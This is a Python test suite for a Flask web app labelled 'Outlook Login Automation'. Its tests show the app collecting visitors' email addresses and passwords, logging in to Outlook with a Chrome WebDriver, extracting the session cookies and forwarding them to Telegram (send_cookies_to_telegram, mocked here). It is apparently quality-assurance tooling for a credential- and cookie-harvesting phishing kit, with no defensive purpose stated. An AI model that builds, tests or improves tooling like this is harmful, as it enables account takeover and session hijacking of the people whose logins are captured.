#!/usr/bin/env python3
"""
Session Testing Script for Outlook Login Automation
Tests Redis session functionality, cookie extraction, and error handling
"""

import sys
import os
import requests
import redis
import json
import time
from datetime import datetime
import unittest
from unittest.mock import patch, Mock

# Add the app directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import after path setup
try:
    from app import app, db, User, SessionLog, redis_client
except ImportError as e:
    print(f"Failed to import app components: {e}")
    print("Make sure you're running this from the application directory")
    sys.exit(1)

class SessionTestCase(unittest.TestCase):
    """Test cases for session functionality"""
    
    def setUp(self):
        """Set up test environment"""
        self.app = app
        self.app.config['TESTING'] = True
        self.app.config['WTF_CSRF_ENABLED'] = False
        self.client = self.app.test_client()
        
        with self.app.app_context():
            db.create_all()
    
    def tearDown(self):
        """Clean up after tests"""
        with self.app.app_context():
            db.session.remove()
            db.drop_all()
    
    def test_session_creation(self):
        """Test that sessions are created properly"""
        response = self.client.get('/')
        
        # Check that we get a successful response
        self.assertEqual(response.status_code, 200)
        
        # Check that session is created
        with self.client.session_transaction() as sess:
            self.assertIn('session_id', sess)
            self.assertIsNotNone(sess['session_id'])
            print(f"✓ Session created with ID: {sess['session_id'][:8]}...")
    
    def test_redis_connection(self):
        """Test Redis connection and session storage"""
        if not redis_client:
            self.skipTest("Redis not available")
        
        try:
            # Test basic Redis operations
            redis_client.set('test_key', 'test_value', ex=10)
            value = redis_client.get('test_key')
            self.assertEqual(value.decode(), 'test_value')
            
            # Clean up
            redis_client.delete('test_key')
            print("✓ Redis connection and operations working")
            
        except Exception as e:
            self.fail(f"Redis test failed: {e}")
    
    def test_email_validation(self):
        """Test email domain validation"""
        # Valid email
        response = self.client.get('/?email=test@gmail.com&step=email')
        self.assertEqual(response.status_code, 200)
        print("✓ Valid email domain accepted")
        
        # Invalid email format
        response = self.client.get('/?email=invalid-email&step=email')
        self.assertIn(b'Invalid format', response.data)
        print("✓ Invalid email format rejected")
    
    def test_session_logging(self):
        """Test session activity logging"""
        with self.app.app_context():
            # Make a request to trigger logging
            response = self.client.get('/?email=test@example.com')
            self.assertEqual(response.status_code, 200)
            
            # Check if log entry was created
            logs = SessionLog.query.all()
            self.assertGreater(len(logs), 0)
            
            latest_log = logs[-1]
            self.assertEqual(latest_log.action, 'page_visit')
            self.assertEqual(latest_log.user_email, 'test@example.com')
            print(f"✓ Session activity logged: {latest_log.action}")
    
    def test_csrf_protection(self):
        """Test CSRF protection on forms"""
        # Try to submit form without CSRF token
        response = self.client.post('/', data={
            'email': 'test@example.com',
            'submit': 'Next'
        })
        
        # Should be redirected or get error due to missing CSRF
        self.assertIn(response.status_code, [302, 400, 403])
        print("✓ CSRF protection working")
    
    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        # Make multiple requests quickly
        responses = []
        for i in range(15):  # Exceed the 10 per minute limit
            response = self.client.get('/')
            responses.append(response.status_code)
        
        # Should get some 429 responses (rate limited)
        rate_limited = sum(1 for code in responses if code == 429)
        if rate_limited > 0:
            print(f"✓ Rate limiting working: {rate_limited} requests blocked")
        else:
            print("⚠ Rate limiting may not be working as expected")
    
    def test_health_endpoint(self):
        """Test health check endpoint"""
        response = self.client.get('/health')
        self.assertEqual(response.status_code, 200)
        
        data = json.loads(response.data)
        self.assertEqual(data['status'], 'healthy')
        self.assertIn('database', data)
        self.assertIn('redis', data)
        print("✓ Health check endpoint working")
    
    def test_debug_endpoint(self):
        """Test debug sessions endpoint"""
        response = self.client.get('/debug/sessions')
        self.assertEqual(response.status_code, 200)
        
        # Should contain session debug information
        self.assertIn(b'Session Debug Dashboard', response.data)
        print("✓ Debug endpoint accessible")
    
    @patch('app.setup_chrome_driver')
    @patch('app.send_cookies_to_telegram')
    def test_login_automation_mock(self, mock_telegram, mock_driver):
        """Test login automation with mocked WebDriver"""
        # Mock WebDriver
        mock_driver_instance = Mock()
        mock_driver_instance.get_cookies.return_value = [
            {
                'name': 'test_cookie',
                'value': 'test_value',
                'domain': '.microsoft.com',
                'path': '/',
                'secure': True,
                'httpOnly': False
            }
        ]
        mock_driver_instance.current_url = 'https://outlook.office.com'
        mock_driver_instance.page_source = '<html>success</html>'
        mock_driver.return_value = mock_driver_instance
        
        # Mock Telegram sending
        mock_telegram.return_value = True
        
        with self.app.app_context():
            # Create test user
            test_email = 'test@example.com'
            test_password = 'TestPassword123!'
            
            # Test the automation flow
            response = self.client.post('/', data={
                'email': test_email,
                'password': test_password,
                'submit': 'Sign in'
            }, query_string={'email': test_email})
            
            # Should handle the mocked automation
            self.assertIn(response.status_code, [200, 302])
            print("✓ Login automation flow (mocked) completed")
    
    def test_session_cleanup(self):
        """Test session cleanup functionality"""
        if not redis_client:
            self.skipTest("Redis not available")
        
        # Create some test sessions
        test_keys = []
        for i in range(3):
            key = f"outlook_automation:test_session_{i}"
            redis_client.set(key, f"test_data_{i}", ex=60)
            test_keys.append(key)
        
        # Test cleanup
        response = self.client.post('/debug/clear-sessions')
        self.assertIn(response.status_code, [200, 302])
        
        # Check if sessions were cleared
        remaining_keys = redis_client.keys('outlook_automation:test_session_*')
        self.assertEqual(len(remaining_keys), 0)
        print("✓ Session cleanup working")

class IntegrationTests:
    """Integration tests for the complete application"""
    
    def __init__(self):
        self.base_url = 'http://localhost:5000'
        self.session = requests.Session()
    
    def test_full_flow(self):
        """Test the complete user flow"""
        print("\n=== Integration Tests ===")
        
        try:
            # Test home page
            response = self.session.get(self.base_url)
            if response.status_code == 200:
                print("✓ Home page accessible")
            else:
                print(f"✗ Home page failed: {response.status_code}")
                return False
            
            # Test health endpoint
            response = self.session.get(f"{self.base_url}/health")
            if response.status_code == 200:
                health_data = response.json()
                print(f"✓ Health check: DB={health_data['database']}, Redis={health_data['redis']}")
            else:
                print(f"✗ Health check failed: {response.status_code}")
            
            # Test debug endpoint
            response = self.session.get(f"{self.base_url}/debug/sessions")
            if response.status_code == 200:
                print("✓ Debug endpoint accessible")
            else:
                print(f"✗ Debug endpoint failed: {response.status_code}")
            
            return True
            
        except requests.exceptions.ConnectionError:
            print("✗ Cannot connect to application. Make sure it's running on localhost:5000")
            return False
        except Exception as e:
            print(f"✗ Integration test error: {e}")
            return False

def run_performance_tests():
    """Run performance tests"""
    print("\n=== Performance Tests ===")
    
    try:
        # Test Redis performance
        if redis_client:
            start_time = time.time()
            for i in range(100):
                redis_client.set(f'perf_test_{i}', f'value_{i}')
                redis_client.get(f'perf_test_{i}')
            
            end_time = time.time()
            duration = (end_time - start_time) * 1000
            print(f"✓ Redis performance: 200 operations in {duration:.2f}ms")
            
            # Cleanup
            keys = redis_client.keys('perf_test_*')
            if keys:
                redis_client.delete(*keys)
        else:
            print("⚠ Redis not available for performance testing")
        
        # Test session creation performance
        with app.test_client() as client:
            start_time = time.time()
            for i in range(50):
                client.get('/')
            end_time = time.time()
            
            duration = (end_time - start_time) * 1000
            print(f"✓ Session creation: 50 requests in {duration:.2f}ms ({duration/50:.2f}ms avg)")
    
    except Exception as e:
        print(f"✗ Performance test error: {e}")

def main():
    """Run all tests"""
    print("🧪 Starting Session Cookie Functionality Tests")
    print("=" * 50)
    
    # Unit tests
    print("\n=== Unit Tests ===")
    unittest.main(argv=[''], exit=False, verbosity=0)
    
    # Integration tests (if app is running)
    integration = IntegrationTests()
    integration.test_full_flow()
    
    # Performance tests
    run_performance_tests()
    
    print("\n" + "=" * 50)
    print("🎉 Test suite completed!")
    print("\nTo run the application:")
    print("  python app.py")
    print("\nTo run only unit tests:")
    print("  python -m unittest test_sessions.py")

if __name__ == '__main__':
    main()
